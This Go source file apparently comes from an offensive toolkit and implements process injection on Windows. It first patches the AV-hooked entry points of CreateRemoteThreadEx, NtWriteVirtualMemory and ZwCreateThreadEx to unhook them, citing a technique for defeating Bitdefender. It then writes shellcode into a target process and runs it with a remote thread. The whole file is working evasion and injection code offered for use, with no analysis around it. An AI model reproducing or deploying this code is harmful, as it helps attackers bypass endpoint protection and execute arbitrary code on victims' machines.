// +build windows

package injector

import (
	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/module/windows/api"
	"project/internal/security"
)

// reference:
// https://shells.systems/defeat-bitdefender-total-security-using-windows-api-unhooking-to-perform-process-injection

var (
	modKernelBase = windows.NewLazySystemDLL("KernelBase.dll")
	modNTDLL      = windows.NewLazySystemDLL("ntdll.dll")

	procCreateRemoteThreadEx = modKernelBase.NewProc("CreateRemoteThreadEx")
	procNtWriteVirtualMemory = modNTDLL.NewProc("NtWriteVirtualMemory")
	procZwCreateThreadEx     = modNTDLL.NewProc("ZwCreateThreadEx")
)

// InjectShellcode is used to inject shellcode to a process.
// warning: shellcode slice will be covered.
func InjectShellcode(pid uint32, sc []byte) error {
	defer security.CoverBytes(sc)

	pHandle := windows.CurrentProcess()

	// patch 1: unhook CreateRemoteThreadEx in KernelBase.dll
	err := procCreateRemoteThreadEx.Find()
	if err != nil {
		return err
	}
	crtAddress := procCreateRemoteThreadEx.Addr()
	_, err = api.WriteProcessMemory(pHandle, crtAddress, []byte{0x4C, 0x8B, 0xDC, 0x53, 0x56})
	if err != nil {
		return errors.WithMessage(err, "failed to unhook CreateRemoteThreadEx")
	}
	// patch 2: unhook NtWriteVirtualMemory in ntdll.dll
	err = procNtWriteVirtualMemory.Find()
	if err != nil {
		return err
	}
	wvmAddress := procNtWriteVirtualMemory.Addr()
	_, err = api.WriteProcessMemory(pHandle, wvmAddress, []byte{0x4C, 0x8B, 0xD1, 0xB8, 0x3A})
	if err != nil {
		return errors.WithMessage(err, "failed to unhook NtWriteVirtualMemory")
	}
	// patch 3: unhook ZwCreateThreadEx in ntdll.dll
	err = procZwCreateThreadEx.Find()
	if err != nil {
		return err
	}
	ctAddress := procZwCreateThreadEx.Addr()
	_, err = api.WriteProcessMemory(pHandle, ctAddress, []byte{0x4C, 0x8B, 0xD1, 0xB8, 0xC1})
	if err != nil {
		return errors.WithMessage(err, "failed to unhook ZwCreateThreadEx")
	}

	// open target process
	const da = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ
	rHandle, err := api.OpenProcess(da, false, pid)
	if err != nil {
		return err
	}

	// alloc memory for shellcode
	scSize := uintptr(len(sc))
	const memType = windows.MEM_COMMIT | windows.MEM_RESERVE
	memAddress, err := api.VirtualAllocEx(rHandle, 0, scSize, memType, windows.PAGE_READWRITE)
	if err != nil {
		return err
	}
	// write shellcode
	for i := uintptr(0); i < scSize; i++ {
		_, err = api.WriteProcessMemory(rHandle, memAddress+i, []byte{sc[int(i)]})
		if err != nil {
			return errors.WithMessage(err, "failed to write shellcode to target process")
		}
	}
	// set shellcode page execute
	oldProtect := new(uint32)
	err = api.VirtualProtectEx(rHandle, memAddress, scSize, windows.PAGE_EXECUTE, oldProtect)
	if err != nil {
		return err
	}
	// execute shellcode
	_, _, err = api.CreateRemoteThread(rHandle, nil, 0, memAddress, nil, 0)
	return err
}
